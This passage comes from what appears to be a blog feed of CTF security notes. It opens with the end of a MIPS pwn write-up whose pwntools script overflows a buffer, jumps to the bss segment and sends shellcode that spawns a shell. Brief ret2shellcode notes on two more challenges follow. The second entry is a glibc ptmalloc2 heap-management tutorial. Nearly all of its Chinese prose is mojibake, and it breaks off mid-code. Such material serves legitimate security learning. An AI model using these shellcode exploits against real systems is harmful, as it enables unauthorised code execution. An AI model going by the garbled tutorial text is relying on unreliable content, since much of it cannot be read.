class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, word_size=<span class="hljs-number">32</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>io=process([<span class="hljs-string">&quot;qemu-mipsel&quot;</span>,<span class="hljs-string">&quot;-L&quot;</span>,<span class="hljs-string">&quot;/usr/mipsel-linux-gnu/&quot;</span>, <span class="hljs-string">&quot;./pwn2.pwn2&quot;</span>])<br><span class="hljs-comment">#io=process([&quot;qemu-mipsel&quot;,&quot;-g&quot;,&quot;1234&quot;,&quot;-L&quot;,&quot;/usr/mipsel-linux-gnu/&quot;, &quot;./pwn2.pwn2&quot;])</span><br><span class="hljs-comment">#qemu-mipsel -g 1234 -L /usr/mipsel-linux-gnu  ./pwn2.pwn2</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span><br>bss=<span class="hljs-number">0x410ba0</span><br>io.sendafter(<span class="hljs-string">&quot;What&#x27;s your name: \n&quot;</span>,payload)<br><br>shellcode = asm(shellcraft.mips.linux.sh(),arch=<span class="hljs-string">&#x27;mips&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p32(bss)+p32(<span class="hljs-number">0x4007e4</span>)<br>io.send(payload)<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x24</span>+p32(<span class="hljs-number">0x410be0</span>)+shellcode<br>io.send(payload)<br>io.interactive()            <br></code></pre></td></tr></table></figure><h3 id="Dasctf-shaopi"><a href="#Dasctf-shaopi" class="headerlink" title="Dasctf shaopi"></a>Dasctf shaopi</h3><p><a href="https://imlzh1.github.io/posts/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-%E8%B6%8A%E8%89%B0%E5%B7%A8-%E8%B6%8A%E7%8B%82%E7%83%AD-pwn-Writeups/#pwn-shaopi">2023DASCTF X 0psu3åä¸€æœˆæŒ‘æˆ˜èµ›ï½œè¶Šè‰°å·¨Â·è¶Šç‹‚çƒ­-pwn-Writeups | imLZH1â€™ Blog</a></p><p>ret2shellcode</p><h3 id="ycb-2020-mipspwn"><a href="#ycb-2020-mipspwn" class="headerlink" title="ycb_2020_mipspwn"></a>ycb_2020_mipspwn</h3><p>ret2shellcode</p><blockquote><p>å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/13294?time__1311=GqmxuD0DnDyAeGNeeequGEDknWwbxAI3x">MIPS PWNå­¦ä¹  - å…ˆçŸ¥ç¤¾åŒº</a><br>å‚è€ƒï¼š<a href="https://zikh26.github.io/posts/919c29c4.html#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0">IOTå®‰å…¨å…¥é—¨å­¦ä¹ â€“MIPSæ±‡ç¼–åŸºç¡€ | ZIKH26â€™s Blog</a><br>å‚è€ƒï¼š<a href="https://www.anquanke.com/post/id/202965#h2-5">MIPS æŒ‡ä»¤é›† Shellcode ç¼–å†™å…¥é—¨-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å°</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¼‚æ¶æ„ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ptmalloc2å†…å­˜ç®¡ç†åˆ†æ</title>
      <link href="/2025/07/01/ctf/heap/ptmalloc/"/>
      <url>/2025/07/01/ctf/heap/ptmalloc/</url>
      
        <content type="html"><![CDATA[<h2 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h2><p>å„ç§å¹³å°æœ‰ä¸åŒçš„å†…å­˜åˆ†é…å™¨å¯ç”¨ï¼š</p><ul><li>dlmalloc â€“ é€šç”¨åˆ†é…å™¨</li><li>Ptmalloc2 â€“ glibc</li><li>jemalloc â€“ FreeBSD å’Œ Firefox</li><li>tcmalloc â€“ Google</li><li>libumem â€“ Solaris</li></ul><p>å†å²ä¸Š<a href="http://www.malloc.de/en/">ptmalloc2</a>Â æ˜¯ä»Â <a href="http://g.oswego.edu/dl/html/malloc.html">dlmalloc</a>Â æ´¾ç”Ÿè€Œæ¥çš„ã€‚åœ¨ fork ä¹‹åï¼Œæ·»åŠ äº†çº¿ç¨‹æ”¯æŒï¼Œå¹¶äº 2006 å¹´å‘å¸ƒã€‚åœ¨æ­£å¼å‘å¸ƒåï¼Œptmalloc2 è¢«é›†æˆåˆ° glibc æºä»£ç ä¸­ã€‚é›†æˆåï¼Œå°†ç›´æ¥å¯¹ glibc malloc æºä»£ç æœ¬èº«è¿›è¡Œä»£ç æ›´æ”¹ã€‚å› æ­¤ï¼Œptmalloc2 å’Œ glibc çš„ malloc å®ç°ä¹‹é—´å¯èƒ½ä¼šæœ‰å¾ˆå¤šå˜åŒ–ã€‚</p><p><img src="/assets/Pasted%20image%2020250411183214.png"></p><p><strong>çº¿ç¨‹ï¼š</strong> åœ¨ Linux çš„æ—©æœŸï¼Œdlmalloc è¢«ç”¨ä½œé»˜è®¤å†…å­˜åˆ†é…å™¨ã€‚ä½†åæ¥ç”±äº ptmalloc2 çš„å¤šçº¿ç¨‹æ”¯æŒï¼Œå®ƒæˆä¸º linux çš„é»˜è®¤å†…å­˜åˆ†é…å™¨ã€‚çº¿ç¨‹æ”¯æŒæœ‰åŠ©äºæé«˜å†…å­˜åˆ†é…å™¨æ€§èƒ½ï¼Œä»è€Œæé«˜åº”ç”¨ç¨‹åºæ€§èƒ½ã€‚åœ¨ dlmalloc ä¸­ï¼Œå½“ä¸¤ä¸ªçº¿ç¨‹åŒæ—¶è°ƒç”¨ malloc æ—¶ï¼Œåªæœ‰ä¸€ä¸ªçº¿ç¨‹å¯ä»¥è¿›å…¥å…³é”®éƒ¨åˆ†ï¼Œå› ä¸ºç©ºé—²åˆ—è¡¨æ•°æ®ç»“æ„åœ¨æ‰€æœ‰å¯ç”¨çº¿ç¨‹ä¹‹é—´å…±äº«ã€‚å› æ­¤ï¼Œåœ¨å¤šçº¿ç¨‹åº”ç”¨ç¨‹åºä¸­ï¼Œå†…å­˜åˆ†é…éœ€è¦æ—¶é—´ï¼Œä»è€Œå¯¼è‡´æ€§èƒ½ä¸‹é™ã€‚è€Œåœ¨ ptmalloc2 ä¸­ï¼Œå½“ä¸¤ä¸ªçº¿ç¨‹åŒæ—¶è°ƒç”¨ malloc æ—¶ï¼Œä¼šç«‹å³åˆ†é…å†…å­˜ï¼Œå› ä¸ºæ¯ä¸ªçº¿ç¨‹éƒ½ç»´æŠ¤ä¸€ä¸ªå•ç‹¬çš„å †æ®µï¼Œå› æ­¤ç»´æŠ¤è¿™äº›å †çš„è‡ªç”±åˆ—è¡¨æ•°æ®ç»“æ„ä¹Ÿæ˜¯ç‹¬ç«‹çš„ã€‚è¿™ç§ä¸ºæ¯ä¸ªçº¿ç¨‹ç»´æŠ¤å•ç‹¬çš„å †å’Œç©ºé—²åˆ—è¡¨æ•°æ®ç»“æ„çš„è¡Œä¸ºç§°ä¸ºÂ <strong>per thread arena</strong>ã€‚</p><ul><li>é™æ€å†…å­˜ç®¡ç†</li></ul><p>é™æ€å†…å­˜ç®¡ç†æ˜¯æŒ‡åœ¨ç¼–è¯‘æ—¶ç¡®å®šå†…å­˜åˆ†é…ï¼Œå¹¶ä¸”å†…å­˜åˆ†é…çš„å¤§å°å’Œç”Ÿå‘½å‘¨æœŸåœ¨ç¨‹åºè¿è¡Œæ—¶ä¿æŒä¸å˜ã€‚æ¯”å¦‚æˆ‘ä»¬ç¼–ç¨‹æ—¶çš„é™æ€å˜é‡å’Œå…¨å±€å˜é‡å°±å±äºé™æ€å†…å­˜ç®¡ç†ï¼Œå¥½å¤„æ˜¯å¿«é€Ÿï¼Œç¼ºç‚¹æ˜¯ä¸å¤Ÿçµæ´»ã€‚</p><ul><li>åŠ¨æ€å†…å­˜ç®¡ç†</li></ul><p>åœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œå †å¯ä»¥æä¾›åŠ¨æ€åˆ†é…çš„å†…å­˜ï¼Œå…è®¸ç¨‹åºç”³è¯·å¤§å°æœªçŸ¥çš„å†…å­˜ã€‚å †å…¶å®å°±æ˜¯ç¨‹åºè™šæ‹Ÿåœ°å€ç©ºé—´çš„ä¸€å—è¿ç»­çš„çº¿æ€§åŒºåŸŸï¼Œå®ƒç”±ä½åœ°å€å‘é«˜åœ°å€æ–¹å‘å¢é•¿ã€‚æˆ‘ä»¬ä¸€èˆ¬ç§°ç®¡ç†å †çš„é‚£éƒ¨åˆ†ç¨‹åºä¸ºå †ç®¡ç†ã€‚</p><ul><li>ä¸€å—å†…å­˜</li><li>å‡ ç§æ•°æ®ç»“æ„</li><li>ä¸€äº›å®‰å…¨æœºåˆ¶</li><li>åŠ¨æ€åˆ†é…å’Œå›æ”¶</li><li>æé«˜åˆ©ç”¨ç‡</li><li>å‡å°‘ç¢ç‰‡åŒ–</li></ul><p>å †ç®¡ç†å™¨å¤„äºç”¨æˆ·ç¨‹åºä¸å†…æ ¸ä¸­é—´ï¼Œä¸»è¦åšä»¥ä¸‹å·¥ä½œ</p><ol><li>å“åº”ç”¨æˆ·çš„ç”³è¯·å†…å­˜è¯·æ±‚ï¼Œå‘æ“ä½œç³»ç»Ÿç”³è¯·å†…å­˜ï¼Œç„¶åå°†å…¶è¿”å›ç»™ç”¨æˆ·ç¨‹åºã€‚åŒæ—¶ï¼Œä¸ºäº†ä¿æŒå†…å­˜ç®¡ç†çš„é«˜æ•ˆæ€§ï¼Œå†…æ ¸ä¸€èˆ¬éƒ½ä¼šé¢„å…ˆåˆ†é…å¾ˆå¤§çš„ä¸€å—è¿ç»­çš„å†…å­˜ï¼Œç„¶åè®©å †ç®¡ç†å™¨é€šè¿‡æŸç§ç®—æ³•ç®¡ç†è¿™å—å†…å­˜ã€‚åªæœ‰å½“å‡ºç°äº†å †ç©ºé—´ä¸è¶³çš„æƒ…å†µï¼Œå †ç®¡ç†å™¨æ‰ä¼šå†æ¬¡ä¸æ“ä½œç³»ç»Ÿè¿›è¡Œäº¤äº’ã€‚</li><li>ç®¡ç†ç”¨æˆ·æ‰€é‡Šæ”¾çš„å†…å­˜ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œç”¨æˆ·é‡Šæ”¾çš„å†…å­˜å¹¶ä¸æ˜¯ç›´æ¥è¿”è¿˜ç»™æ“ä½œç³»ç»Ÿçš„ï¼Œè€Œæ˜¯ç”±å †ç®¡ç†å™¨è¿›è¡Œç®¡ç†ã€‚è¿™äº›é‡Šæ”¾çš„å†…å­˜å¯ä»¥ç”¨æ¥å“åº”æ–°ç”³è¯·çš„å†…å­˜çš„è¯·æ±‚ã€‚</li></ol><p><img src="/assets/Pasted%20image%2020250330115151.png"></p><p><img src="/assets/Pasted%20image%2020250330115205.png"></p><p>ç¬¬ä¸€ä¸ªmallocå®Œæˆçš„æ—¶å€™ï¼Œtop chunkå°±å­˜åœ¨äº†ã€‚</p><p>top chunkåŒ…å«arenaæ‰©å®¹çš„éƒ¨åˆ†ï¼Œä¸å±äºä»»ä½•bin</p><p><img src="/assets/Pasted%20image%2020250330115231.png"></p><p><img src="/assets/Pasted%20image%2020250330115251.png"></p><p><img src="/assets/Pasted%20image%2020250330115326.png"></p><p><img src="/assets/Pasted%20image%2020250330115428.png"></p><p><img src="/assets/Pasted%20image%2020250330115440.png"></p><p><img src="/assets/Pasted%20image%2020250330115451.png"></p><p><img src="/assets/Pasted%20image%2020250330115500.png"></p><p><img src="/assets/Pasted%20image%2020250330115512.png"></p><p><img src="/assets/Pasted%20image%2020250330115524.png"></p><p><img src="/assets/Pasted%20image%2020250330115537.png"></p><p><img src="/assets/Pasted%20image%2020250330115549.png"></p><p><img src="/assets/Pasted%20image%2020250330115603.png"></p><p>åŠ¨æ€å†…å­˜ç®¡ç†æ˜¯æŒ‡åœ¨ç¨‹åºè¿è¡Œæ—¶æ ¹æ®éœ€è¦è¿›è¡Œå†…å­˜åˆ†é…å’Œé‡Šæ”¾ï¼Œç”±ç¨‹åºå‘˜æ˜¾å¼ç®¡ç†ã€‚è¿™ä¸ªæœ€æ˜¾è‘—çš„ä¾‹å­å°±æ˜¯æˆ‘ä»¬çš„<code>malloc</code>å’Œ<code>free</code>å‡½æ•°ã€‚å¥½å¤„æ˜¯çµæ´»ï¼Œç¼ºç‚¹æ˜¯å¤æ‚ã€‚</p><p>æˆ‘ä»¬åœ¨ç¼–å†™ C è¯­è¨€ç¨‹åºæ—¶<code>malloc</code>ä¸€å—å†…å­˜æ˜¯ç”±å †ç®¡ç†å™¨ï¼ˆptmallocï¼‰åˆ†é…äº†ä¸€å—å†…å­˜ç»™æˆ‘ä»¬ä½¿ç”¨ï¼Œ<code>malloc</code>è¿”å›çš„æ˜¯æŒ‡å‘é‚£å—å†…å­˜çš„æŒ‡é’ˆã€‚</p><p>ä¾‹å¦‚ä¸‹é¢çš„ä»£ç ï¼Œä¼šå°†<code>malloc</code>åˆ†é…çš„å†…å­˜åœ°å€ä¿å­˜åœ¨<code>ptr</code>æŒ‡é’ˆä¸­ï¼Œæˆ‘ä»¬é€šè¿‡<code>ptr</code>æŒ‡é’ˆæ¥ä½¿ç”¨è¿™å—å†…å­˜ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> *ptr=(<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br></code></pre></td></tr></table></figure><p><code>malloc</code>é€šè¿‡ ptmalloc å‘æˆ‘ä»¬åˆ†é…è¿™å—å†…å­˜ï¼Œè€Œå†…å­˜åˆ†é…å¤šå°‘æ˜¯ç”± ptmalloc çš„åˆ†é…æœºåˆ¶æ¥å†³å®šçš„ã€‚</p><h2 id="å†…å­˜å¸ƒå±€"><a href="#å†…å­˜å¸ƒå±€" class="headerlink" title="å†…å­˜å¸ƒå±€"></a>å†…å­˜å¸ƒå±€</h2><ul><li>32ä½ç¨‹åºç»å…¸å†…å­˜å¸ƒå±€ï¼š<ul><li>æœ€é«˜åœ°å€çš„ 1G å†…å­˜ç©ºé—´å±äºå†…æ ¸ç©ºé—´ä¸èƒ½ä½¿ç”¨ã€‚</li><li>å†…æ ¸ç©ºé—´ä»¥ä¸‹çš„ç©ºé—´å±äºæ ˆï¼Œæ ˆè‡ªé¡¶å‘ä¸‹å¢é•¿ï¼Œæœ€å¤§å¤§å°ä¸º 8M</li><li>æ ˆä»¥ä¸‹ä¾¿æ˜¯<code>mmap</code>åŒºåŸŸï¼Œç©ºé—´å‘ä¸Šå¢é•¿ï¼Œå’Œæ ˆç›¸å¯¹ã€‚</li><li><code>heap</code>æ®µè‡ªåº•å‘ä¸Šå¢é•¿ã€‚</li><li>å‰©ä¸‹çš„ç©ºé—´å±äºå¯æ‰§è¡Œæ–‡ä»¶ç©ºé—´ï¼Œå³<code>bss</code>æ®µã€<code>data</code>æ®µã€<code>text</code>æ®µ</li></ul></li></ul><p><img src="/../assets/Pasted%20image%2020241105124201.png"></p><ul><li>64ä½ç¨‹åºç»å…¸å†…å­˜å¸ƒå±€ï¼š<ul><li>æœ€é«˜åœ°å€çš„ 128TB å†…å­˜ç©ºé—´å±äºå†…æ ¸ç©ºé—´ä¸èƒ½ä½¿ç”¨ã€‚</li><li>å†…æ ¸ç©ºé—´ä»¥ä¸‹çš„ç©ºé—´å±äºæ ˆï¼Œæ ˆè‡ªé¡¶å‘ä¸‹å¢é•¿ï¼Œæœ€å¤§å¤§å°ä¸º 8M</li><li>æ ˆä»¥ä¸‹ä¾¿æ˜¯<code>mmap</code>åŒºåŸŸï¼Œç©ºé—´å‘ä¸Šå¢é•¿ï¼Œå’Œæ ˆç›¸å¯¹ã€‚</li><li><code>heap</code>æ®µè‡ªåº•å‘ä¸Šå¢é•¿ã€‚</li><li>å‰©ä¸‹çš„ç©ºé—´å±äºå¯æ‰§è¡Œæ–‡ä»¶ç©ºé—´ï¼Œå³<code>bss</code>æ®µã€<code>data</code>æ®µã€<code>text</code>æ®µ</li></ul></li></ul><p>![[..&#x2F;..&#x2F;..&#x2F;RE&#x2F;assets&#x2F;assets&#x2F;Pasted image 20240630112911.png]]</p><h2 id="Cè¯­è¨€å†…å­˜æ“ä½œå‡½æ•°"><a href="#Cè¯­è¨€å†…å­˜æ“ä½œå‡½æ•°" class="headerlink" title="Cè¯­è¨€å†…å­˜æ“ä½œå‡½æ•°"></a>Cè¯­è¨€å†…å­˜æ“ä½œå‡½æ•°</h2><ul><li><code>malloc</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span>* <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span>;<br></code></pre></td></tr></table></figure><ul><li><code>realloc</code></li></ul><p>å¦‚æœ<code>ptr</code>ä¸ºç©ºï¼Œåˆ™<code>realloc</code>çš„è¡Œä¸ºç±»ä¼¼äº<code>malloc</code>ã€‚å¦‚æœ<code>size</code>ä¸º0ï¼Œåˆ™å®ƒçš„è¡Œä¸ºç±»ä¼¼äº<code>free</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span>* <span class="hljs-title function_">realloc</span><span class="hljs-params">(<span class="hljs-type">void</span>* ptr, <span class="hljs-type">size_t</span> size)</span>;<br></code></pre></td></tr></table></figure><ul><li><code>calloc</code></li></ul><p>ä¸<code>malloc</code>ä¸åŒçš„æ˜¯ï¼Œ<code>calloc</code>åˆ†é…çš„å†…å­˜ä¼šè‡ªåŠ¨æ¸…é›¶ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span>* <span class="hljs-title function_">calloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> num, <span class="hljs-type">size_t</span> size)</span>;<br></code></pre></td></tr></table></figure><ul><li><code>free</code></li></ul><p>é‡Šæ”¾ç”±<code>malloc</code>ã€<code>calloc</code>æˆ–<code>realloc</code>åˆ†é…çš„å†…å­˜å—ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">free</span><span class="hljs-params">(<span class="hljs-type">void</span>* ptr)</span>;<br></code></pre></td></tr></table></figure><h2 id="å†…å­˜åˆ†é…èƒŒåçš„ç³»ç»Ÿè°ƒç”¨"><a href="#å†…å­˜åˆ†é…èƒŒåçš„ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="å†…å­˜åˆ†é…èƒŒåçš„ç³»ç»Ÿè°ƒç”¨"></a>å†…å­˜åˆ†é…èƒŒåçš„ç³»ç»Ÿè°ƒç”¨</h2><h3 id="brkå’Œsbrk"><a href="#brkå’Œsbrk" class="headerlink" title="brkå’Œsbrk"></a>brkå’Œsbrk</h3><p><code>brk</code>æ˜¯ç³»ç»Ÿè°ƒç”¨ï¼Œ<code>sbrk</code>ä¸ºåº“å‡½æ•°ã€‚ç³»ç»Ÿè°ƒç”¨è´Ÿè´£æä¾›ä¸€ç§æœ€å°åŠŸèƒ½ï¼Œè€Œåº“å‡½æ•°åˆ™æä¾›æ¯”è¾ƒå¤æ‚çš„åŠŸèƒ½ã€‚<code>malloc</code>å‡½æ•°æ—å°±æ˜¯è°ƒç”¨<code>sbrk</code>å‡½æ•°å°†æ•°æ®æ®µçš„ä¸‹ç•Œç§»åŠ¨åˆ†é…å†…å­˜ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">brk</span><span class="hljs-params">(<span class="hljs-type">void</span> *end_data_segment)</span>;<br><span class="hljs-type">void</span> *<span class="hljs-title function_">sbrk</span><span class="hljs-params">(<span class="hljs-type">intptr_t</span> increment)</span>;<br></code></pre></td></tr></table></figure><h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h3><p><code>mmap</code>å‡½æ•°åœ¨ Linux ç³»ç»Ÿä¸­ä¸»è¦ä½œç”¨æ˜¯å°†æ–‡ä»¶æˆ–è®¾å¤‡æ˜ å°„åˆ°è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œä¹Ÿå¯ä»¥ç”¨äºåœ¨ä¸ä¾èµ–æ–‡ä»¶çš„æƒ…å†µä¸‹åˆ†é…åŒ¿åå†…å­˜åŒºåŸŸã€‚</p><p><code>mmap</code>åœ¨å†…å­˜åˆ†é…ä¸­ç”¨äºåŒ¿åæ˜ å°„ï¼Œç›´æ¥å‘æ“ä½œç³»ç»Ÿè¯·æ±‚å†…å­˜ï¼Œè€Œä¸æ”¹å˜è¿›ç¨‹çš„å †åŒºåŸŸã€‚è¿™æ ·åˆ†é…æ–¹å¼è¦æ¯”<code>brk</code>æ›´çµæ´»ä¸€ç‚¹ï¼Œé€‚åˆåˆ†é…è¾ƒå¤§çš„å†…å­˜å—ã€‚<code>malloc</code>å‡½æ•°çš„å®ç°ä¸­ï¼Œé€šè¿‡ä½¿ç”¨<code>mmap</code>åˆ†é…è¶…è¿‡ä¸€å®šå¤§å°ï¼ˆå¦‚128kbï¼‰çš„å†…å­˜å—ã€‚</p><p><code>munmap</code>å‡½æ•°ç”¨äºå°†ç‰¹å®šåœ°å€åŒºåŸŸçš„å¯¹è±¡æ˜ å°„åˆ é™¤æ‰ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">mmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr, <span class="hljs-type">size_t</span> length, <span class="hljs-type">int</span> prot, <span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> fd, <span class="hljs-type">off_t</span> offset)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">munmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr,<span class="hljs-type">size_t</span> length)</span>;<br></code></pre></td></tr></table></figure><h2 id="gdbè°ƒè¯•"><a href="#gdbè°ƒè¯•" class="headerlink" title="gdbè°ƒè¯•"></a>gdbè°ƒè¯•</h2><ul><li>å¸¸ç”¨å‘½ä»¤</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell">vmmap #æŸ¥çœ‹è¿›ç¨‹çš„å†…å­˜å¸ƒå±€<br>heap #æŸ¥çœ‹æ‰€æœ‰å †<br>bins #æŸ¥çœ‹æ‰€æœ‰bin<br>heap -v #æŸ¥çœ‹å †å—çš„è¯¦ç»†ä¿¡æ¯<br>vis #å¯è§†åŒ–å †<br>arenaÂ #æ˜¾ç¤ºarenaçš„è¯¦ç»†ä¿¡æ¯<br>x/32gx &amp;main_arena #æŸ¥çœ‹main_arenaä¸Šçš„å€¼<br>call malloc_stats() #æ‰“å°mallocåˆ†é…çš„å†…å­˜<br>p malloc(0x100) #æ‰“å°åˆ†é…çš„å †å—<br>heapbase #æŸ¥çœ‹å †çš„èµ·å§‹åœ°å€<br>heapinfo #æ˜¾ç¤ºå †çš„ä¿¡æ¯<br>parseheap #æ˜¾ç¤ºå †ç»“æ„<br>info threads #å¤šçº¿ç¨‹è°ƒè¯•<br>tracemalloc #ä¼šæç¤ºæ‰€æœ‰æ“ä½œå †çš„åœ°æ–¹<br>arenasÂ #æ˜¾ç¤ºæ‰€æœ‰arenaçš„åŸºæœ¬ä¿¡æ¯<br>arenainfoÂ #å¥½çœ‹çš„æ˜¾ç¤ºæ‰€æœ‰arenaçš„ä¿¡æ¯<br>p &amp;__free_hook #æŸ¥çœ‹æŸä¸ªå‡½æ•°çš„çœŸå®åœ°å€<br>p *__free_hook #æŸ¥çœ‹æŸä¸ªå‡½æ•°çš„æŒ‡å‘<br></code></pre></td></tr></table></figure><p>ä¸ªäººæ¯”è¾ƒå–œæ¬¢é€šè¿‡<code>patchelf</code>ä¿®æ”¹ç¨‹åº<code>ld</code>å’Œ<code>libc</code>è¿›è¡Œè°ƒè¯•ã€‚</p><h2 id="æ•°æ®ç»“æ„"><a href="#æ•°æ®ç»“æ„" class="headerlink" title="æ•°æ®ç»“æ„"></a>æ•°æ®ç»“æ„</h2><p>glibc çš„æ•°æ®ç»“æ„ä¸­æœ‰<code>tcache</code>æœºåˆ¶å’Œæ²¡æœ‰<code>tcache</code>æœºåˆ¶æ˜¯å­˜åœ¨ä¸€äº›åŒºåˆ«çš„ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬ä¼šå¯¹æ¯”æ²¡æœ‰<code>tcache</code>æœºåˆ¶çš„ glibc2.23 å’Œ æœ‰<code>tcache</code>æœºåˆ¶çš„ glibc2.27 çš„åŒºåˆ«ã€‚</p><h3 id="malloc-par"><a href="#malloc-par" class="headerlink" title="malloc_par"></a>malloc_par</h3><p>åœ¨ ptmalloc ä¸­ä½¿ç”¨<code>malloc_par</code>ç»“æ„ä½“æ¥è®°å½•å †ç®¡ç†å™¨çš„ç›¸å…³å‚æ•°ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰äº<code>malloc.c</code>ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><ul><li>2.23</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_par</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* Tunable parameters */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> trim_threshold;<br>  INTERNAL_SIZE_T top_pad;<br>  INTERNAL_SIZE_T mmap_threshold;<br>  INTERNAL_SIZE_T arena_test;<br>  INTERNAL_SIZE_T arena_max;<br><br>  <span class="hljs-comment">/* Memory map support */</span><br>  <span class="hljs-type">int</span> n_mmaps;<br>  <span class="hljs-type">int</span> n_mmaps_max;<br>  <span class="hljs-type">int</span> max_n_mmaps;<br>  <span class="hljs-comment">/* the mmap_threshold is dynamic, until the user sets</span><br><span class="hljs-comment">     it manually, at which point we need to disable any</span><br><span class="hljs-comment">     dynamic behavior. */</span><br>  <span class="hljs-type">int</span> no_dyn_threshold;<br><br>  <span class="hljs-comment">/* Statistics */</span><br>  INTERNAL_SIZE_T mmapped_mem;<br>  <span class="hljs-comment">/*INTERNAL_SIZE_T  sbrked_mem;*/</span><br>  <span class="hljs-comment">/*INTERNAL_SIZE_T  max_sbrked_mem;*/</span><br>  INTERNAL_SIZE_T max_mmapped_mem;<br>  INTERNAL_SIZE_T max_total_mem;  <span class="hljs-comment">/* only kept for NO_THREADS */</span><br><br>  <span class="hljs-comment">/* First address handed out by MORECORE/sbrk.  */</span><br>  <span class="hljs-type">char</span> *sbrk_base;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>2.27</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 